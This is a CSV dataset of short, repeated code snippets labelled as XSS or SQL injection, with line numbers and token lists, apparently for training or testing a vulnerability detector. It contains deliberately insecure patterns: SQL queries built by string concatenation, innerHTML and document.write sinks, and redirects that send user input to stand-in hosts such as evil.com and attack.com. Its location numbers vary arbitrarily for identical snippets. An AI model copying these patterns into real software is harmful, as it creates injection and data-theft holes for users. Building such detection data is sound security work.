Code Snippet,Vulnerability Type,Location,Preprocessed Tokens
"document.write('<script src=""evil.js""></script>');",XSS,3,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,2,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,3,"[""alert('Hello"", ""'"", '+', 'user_input);']"
alert('Hello ' + user_input);,XSS,1,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,12,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,16,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,5,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,12,"[""alert('Hello"", ""'"", '+', 'user_input);']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,9,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,19,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,10,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,19,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,7,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,5,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,1,"[""alert('Hello"", ""'"", '+', 'user_input);']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,2,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.getElementById('input').innerHTML = user_input;,XSS,20,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,13,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,16,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,10,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,16,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,2,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,9,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,19,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,2,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,14,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.location = 'http://evil.com?username=' + user_input;,XSS,9,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,18,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,16,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,16,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,1,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
alert('Hello ' + user_input);,XSS,1,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,18,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,3,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,20,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,2,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,11,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,20,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
alert('Hello ' + user_input);,XSS,6,"[""alert('Hello"", ""'"", '+', 'user_input);']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,9,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,15,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,14,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,4,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,11,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.getElementById('input').innerHTML = user_input;,XSS,2,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,12,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,9,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,16,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.location = 'http://evil.com?username=' + user_input;,XSS,20,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,11,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,3,"[""alert('Hello"", ""'"", '+', 'user_input);']"
alert('Hello ' + user_input);,XSS,5,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,3,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,3,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,13,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,16,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,14,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,13,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,20,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,4,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,6,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,11,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,14,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,3,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,9,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,16,"[""alert('Hello"", ""'"", '+', 'user_input);']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,17,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,12,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
